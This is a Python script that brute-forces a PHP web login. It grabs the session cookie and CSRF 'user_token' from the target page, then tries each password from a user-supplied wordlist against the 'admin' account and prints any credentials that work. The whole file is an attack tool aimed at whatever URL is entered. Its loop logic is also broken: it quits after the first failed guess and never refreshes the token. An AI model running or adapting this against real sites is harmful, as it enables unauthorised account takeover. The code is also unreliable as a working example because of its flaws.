#!/usr/bin/python3

#Import needed Libs
import requests
from bs4 import BeautifulSoup  ##For pulling data from XML
import re
import colorama
from colorama import Fore, Back, Style

url = input("Enter Target URL: ")
user = 'admin'
passwordfile = input("Enter Password File: ")
pf = open(passwordfile, "r")
passwords = pf.readlines()
pf.close()
done = False
print("Cracking " + url + "\n")

##Trying our Code
try:
    r = requests.get(url, timeout=10)
except ConnectionRefusedError:   ##client cannot connect
    print("Server is unavailable!")
session_id = re.match("PHPSESSID=(.*?);", r.headers["set-cookie"])
session_id = session_id.group(1)
print("Session ID: "+ session_id)
cookie = {"PHPSESSID": session_id}
soup = BeautifulSoup(r.text, "html.parser")
user_token = soup.find("input", {"name":"user_token"})["value"]
print("User Token : " + user_token + "\n")

#Brute Forcing for python:
for password in passwords:
    if not done:
        password = password.rstrip()
        payload = {"username": user, "password": password, "Login": "Login" , "user_token": user_token}
        reply = requests.post(url, payload, cookies=cookie, allow_redirects=False)
        results = reply.headers["Location"]
        print("Trying: "+ user + "-" + password)
        if "index.php" in results:
            print(Fore.GREEN + "Creds are: " + user + ":" + password)
            done = True
        else:
            break
